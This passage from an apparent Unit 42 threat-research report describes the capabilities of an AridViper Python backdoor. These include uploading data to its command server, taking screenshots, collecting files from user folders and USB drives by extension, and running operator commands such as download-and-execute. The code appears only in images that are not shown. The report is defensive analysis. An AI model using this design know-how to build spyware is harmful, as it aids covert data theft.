<p>Both the mentioned threads, as well as the operators via C2 interaction, can invoke upload code. Here is one example of such a method, where the implementation can be observed:</p>
<figure id="attachment_110206" aria-describedby="caption-attachment-110206" style="width: 900px" class="wp-caption aligncenter"><img class="wp-image-110206" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/word-image-206.png" alt="Both the mentioned threads, as well as the operators via C2 interaction, can invoke upload code. The implementation can be observed in the example shown here. " width="900" height="562" /><figcaption id="caption-attachment-110206" class="wp-caption-text">Figure 25. Upload method example.</figcaption></figure>
<h6><a id="post-110155-_ezzjqz2haf3j"></a><strong>Screenshot Capabilities</strong></h6>
<p>Screenshots are sent to the C2 using Python’s <a href="https://pypi.org/project/mss/">mss</a> library both periodically as well as on demand if the C2 operator sends the appropriate command.</p>
<figure id="attachment_110208" aria-describedby="caption-attachment-110208" style="width: 900px" class="wp-caption aligncenter"><img class="wp-image-110208" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/word-image-207.png" alt="Screenshots are sent to the C2 using Python’s mss library both periodically as well as on demand if the C2 operator sends the appropriate command." width="900" height="505" /><figcaption id="caption-attachment-110208" class="wp-caption-text">Figure 26. Screenshot capabilities.</figcaption></figure>
<h6><a id="post-110155-_y2685zf8k59m"></a><strong>File Gathering Information</strong></h6>
<p>Throughout the code, multiple methods oriented toward collecting information can be found. The methods are invoked based on different interactions with the C2 operator, and they give the operators flexibility on what kind of information they want to collect.</p>
<p>For example, there are generic methods to collect specific folders and with different levels of information detailed, as can be seen in several of the figures below.</p>
<figure id="attachment_110210" aria-describedby="caption-attachment-110210" style="width: 900px" class="wp-caption aligncenter"><img class="wp-image-110210" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/word-image-208.png" alt="Throughout the code, multiple methods oriented toward collecting information can be found. That includes the collection of samples under C:\users and C:\Documents and settings. " width="900" height="936" /><figcaption id="caption-attachment-110210" class="wp-caption-text">Figure 27. Collection of samples under C:\users and C:\Documents and Settings.</figcaption></figure>
<figure id="attachment_110212" aria-describedby="caption-attachment-110212" style="width: 900px" class="wp-caption aligncenter"><img class="wp-image-110212" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/word-image-209.png" alt="Throughout the code, multiple methods oriented toward collecting information can be found. That includes the collection of samples under several folders of interest in JSON format. " width="900" height="1347" /><figcaption id="caption-attachment-110212" class="wp-caption-text">Figure 28. Detailed collection of samples under several folders of interest in JSON format.</figcaption></figure>
<p>There are methods to collect information from external drives:</p>
<figure id="attachment_110214" aria-describedby="caption-attachment-110214" style="width: 900px" class="wp-caption aligncenter"><img class="wp-image-110214" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/word-image-210.png" alt="Throughout the code, multiple methods oriented toward collecting information can be found. That includes the collection of information from external drives, as shown here. " width="900" height="582" /><figcaption id="caption-attachment-110214" class="wp-caption-text">Figure 29. Example of USB information collection.</figcaption></figure>
<p>As well as other approaches, such as methods to focus on specific file extensions.</p>
<figure id="attachment_110216" aria-describedby="caption-attachment-110216" style="width: 900px" class="wp-caption aligncenter"><img class="wp-image-110216" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/word-image-211.png" alt="Throughout the code, multiple methods oriented toward collecting information can be found. That includes the collection of file information by specific extension type shown here." width="900" height="892" /><figcaption id="caption-attachment-110216" class="wp-caption-text">Figure 30. Example of collection of file information by specific extension type.</figcaption></figure>
<h6><a id="post-110155-_v8u34eq6uvqb"></a><strong>File Retrieval</strong></h6>
<p>File operators have plenty of commands that allow different types of files to be collected from disk. This method of collection is normally accomplished by selecting the target files and using the legitimate RAR utility to compress data that will be uploaded to the C2. The following example shows how the commands focus on specific extensions:</p>
<figure id="attachment_110218" aria-describedby="caption-attachment-110218" style="width: 900px" class="wp-caption aligncenter"><img class="wp-image-110218" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/word-image-212.png" alt="This example shows how C2 commands focus on specific extensions when selecting, compressing and gathering files. " width="900" height="705" /><figcaption id="caption-attachment-110218" class="wp-caption-text">Figure 31. Example of file selection, compression and gathering by extension type.</figcaption></figure>
<h6><a id="post-110155-_scd5fqonz4u"></a><strong>Command Execution</strong></h6>
<p>The AridViper operators have the ability to send parameters together with the commands across the C2 interaction. These commands are split by a specific delimiter ‘;’ in this sample, travelling encoded in base64. The sample has different options implemented, allowing the operators very flexible execution of commands such as download and execution of payloads from a given URL, process execution, etc.</p>
<figure id="attachment_110220" aria-describedby="caption-attachment-110220" style="width: 820px" class="wp-caption aligncenter"><img class="wp-image-110220" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/word-image-213.png" alt="The sample has different options implemented, allowing the operators very flexible execution of commands such as download and execution of payloads from a given URL, process execution, etc." width="820" height="444" /><figcaption id="caption-attachment-110220" class="wp-caption-text">Figure 32. URL download and process execution examples.</figcaption></figure>
          <div class="article__subscribe mb-40 text-gray-400 bg-gray-200 rounded-lg">
  <h4 class="h3 mb-10 text-black">Get updates from <br class="d-sm-none"> Palo Alto<br class="d-sm-none"> Networks!</h4>
  <p>Sign up to receive the latest news, cyber threat intelligence and research from us</p>
  <!-- <form action="https://app-guse4001.marketo.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe"> -->
  <form action="https://start.paloaltonetworks.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe">
    <input type="hidden" value="1086" name="formid">
    <!-- <input type="hidden" value="818-CZC-273" name="munchkinId"> -->
    <input type="hidden" value="531-OCS-018" name="munchkinId">
    <input type="hidden" value="2141" name="lpId">
    <input type="hidden" value="1086" name="formVid">
    <input type="hidden" name="mkto_optinunit42" value="true">
    <input type="hidden" name="mkto_opt-in" value="true">
    <div class="row">
      <div class="col-sm col-12 mb-sm-0 mb-15">
        <input type="email" name="Email" placeholder="Email address" class="subscribe-field d-block w-100 px-sm-25 px-15 bg-white">
        <p class="error-mail d-none mt-15 text-danger" style="color: #dc3545">Please enter your email address!</p>
      </div>
      <div class="col-sm-auto col-12">
          <input type="submit" value="Subscribe" class="btn btn--black btn--sm w-100" disabled="disabled">
      </div>
    </div>

    <div class="google-recapth mt-15">
      <div class="g-recaptcha" data-expired-callback="captchaExpires" data-callback="captchaComplete" data-sitekey="6LfKOrwUAAAAAOwgjxrEcx-pcfwe8OquUw6ommTK"></div>
      <p class="error-recaptcha d-none mt-15 text-danger" style="color: #dc3545">Please mark, I'm not a robot!</p>
    </div>
  </form>

  <div class="font-size-ex-sm col-sm-7 p-0">
    <p>By submitting this form, you agree to our <a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a> and acknowledge our <a href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy Statement</a>.</p>
  </div>
</div>

<script type="text/javascript" src="https://researchcenter.paloaltonetworks.com/wp-content/plugins/google-analyticator/external-tracking.min.js?ver=6.4.9"></script>
        </div>
      </div>
    </div>
  </article>
<footer class="site-footer px-sm-0 px-15">
  <div class="pt-40">
    <div class="container pt-sm-30">
      <div class="row justify-content-lg-center">
        <div class="col-lg-11 col-12">
          <div class="row">
            <div class="col-lg-4 col-sm-3 col-12 order-sm-2">
              <nav class="footer-socials mb-sm-0 mb-25 text-white text-sm-right">
                                                <a href="https://twitter.com/Unit42_Intel" target="_blank"><span class="ui ui-4"></span></a>
                <a href="https://github.com/pan-unit42" target="_blank"><span class="ui ui-5"></span></a>
              </nav>
            </div>

            <div class="col-lg-8 col-sm-9 col-12 order-sm-1">
              <div class="row">
                <div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Popular Resources</h4><div class="menu-footer-company-phase-container"><ul id="menu-footer-company-phase" class="menu"><li id="menu-item-97096" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97096"><a target="_blank" href="https://www.paloaltonetworks.com/resources">Resource Center</a></li>
<li id="menu-item-97097" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97097"><a target="_blank" href="https://researchcenter.paloaltonetworks.com/">Blog</a></li>
<li id="menu-item-97098" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97098"><a target="_blank" href="https://www.paloaltonetworks.com/communities">Communities</a></li>
<li id="menu-item-97099" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97099"><a target="_blank" href="https://docs.paloaltonetworks.com/">Tech Docs</a></li>
<li id="menu-item-97100" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-97100"><a href="https://unit42.paloaltonetworks.com/">Unit 42</a></li>
<li id="menu-item-97101" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97101"><a target="_blank" href="https://www.paloaltonetworks.com/sitemap">Sitemap</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Legal Notices</h4><div class="menu-footer-legal-notices-phase-container"><ul id="menu-footer-legal-notices-phase" class="menu"><li id="menu-item-97093" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97093"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy</a></li>
<li id="menu-item-97094" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97094"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a></li>
<li id="menu-item-97095" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97095"><a target="_blank" href="https://www.paloaltonetworks.com/legal">Documents</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Account</h4><div class="menu-footer-trending-topics-phase-container"><ul id="menu-footer-trending-topics-phase" class="menu"><li id="menu-item-97102" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97102"><a href="https://start.paloaltonetworks.com/preference-center">Manage Subscriptions</a></li>
<li id="menu-item-97103" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97103"><a href="#">&nbsp;</a></li>
<li id="menu-item-97104" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97104"><a href="https://www.paloaltonetworks.com/security-disclosure">Report a Vulnerability</a></li>
</ul></div></div>              </div>
            </div>
          </div>

          
            <div class="copyrights py-25 mt-40">
               <p>© 2020 Palo Alto Networks, Inc. All rights reserved.</p>
            </div>
          
        </div>
      </div>
    </div>
  </div>
</footer>
    <script type="text/javascript">
	var isProcessing = false; 
    function alter_ul_post_values(obj,post_id,ul_type){
	
		if (isProcessing)    
		return;  
		isProcessing = true;   
		
		jQuery(obj).find("span").html("..");
                jQuery.ajax({
                    type: "POST",
                    url: "https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php",
                    data: "post_id="+post_id+"&up_type="+ul_type,
                    success: function(msg){
                            jQuery(obj).find("span").html(msg);
                            isProcessing = false; 
                            jQuery(obj).find('svg').children('path').attr('stroke','#0050FF');
                            jQuery(obj).removeClass('idc_ul_cont_not_liked idc_ul_cont_not_liked_inner');
                    }
 		});
	}
	</script>
    <link rel='stylesheet' id='wpdevart_lightbox_front_end_css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/wpdevart_lightbox_front.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpdevart_lightbox_effects-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/effects_lightbox.css?ver=5.4.1' type='text/css' media='all' />
<script type='text/javascript' src='https://www.google.com/recaptcha/api.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/scripts/main.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/wp-embed.min.js?ver=5.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpdevart_lb_variables = {"eneble_lightbox_content":"enable","overlay_transparency_prancent":"80","enable_video_popuping":"enable","popup_background_color":"#000000","popup_loading_image":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/popup_loading.png","popup_initial_width":"350","popup_initial_height":"300","popup_youtube_width":"640","popup_youtube_height":"410","popup_vimeo_width":"500","popup_vimeo_height":"410","popup_max_width":"5000","popup_max_height":"5000","popup_position":"5","popup_fixed_position":"true","popup_outside_margin":"0","popup_border_width":"2","popup_border_color":"#000000","popup_border_radius":"10","control_buttons_show":"true","control_buttons_show_in_content":"false","control_buttons_height":"30","control_buttons_line_bg_color":"#000000","control_button_prev_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev.png","control_button_prev_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev_hover.png","control_button_next_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next.png","control_button_next_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next_hover.png","control_button_download_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download.png","control_button_download_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download_hover.png","control_button_innewwindow_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow.png","control_button_innewwindow_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow_hover.png","control_button_fullwidth_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth.png","control_button_fullwidht_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth_hover.png","control_button_fullwidthrest_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset.png","control_button_fullwidhtrest_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset_hover.png","control_button_close_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close.png","control_button_close_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close_hover.png","information_panel_show":"false","information_panel_show_in_content":"false","information_panel_bg_color":"#000000","information_panel_default_transparency":"100","information_panel_hover_trancparency":"100","information_panel_count_image_after_text":"Image","information_panel_count_image_middle_text":"of","information_panel_count_padding_left":"15","information_panel_count_padding_right":"4","information_panel_count_font_size":"20","information_panel_desc_padding_left":"15","information_panel_desc_padding_right":"4","information_panel_desc_font_size":"20","information_panel_desc_show_if_not":"true","information_panel_text_for_no_caption":"No Caption","information_panel_title_padding_left":"5","information_panel_title_padding_right":"5","information_panel_title_font_size":"15","information_panel_title_show_if_not":"true","information_panel_text_for_no_title":"No Title","information_panel_ordering":"{\"count\":[1,\"count\"],\"title\":[0,\"title\"],\"caption\":[0,\"caption\"]}"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/javascript/wpdevart_lightbox_front.js?ver=1.0'></script>
          
  </body>
</html>
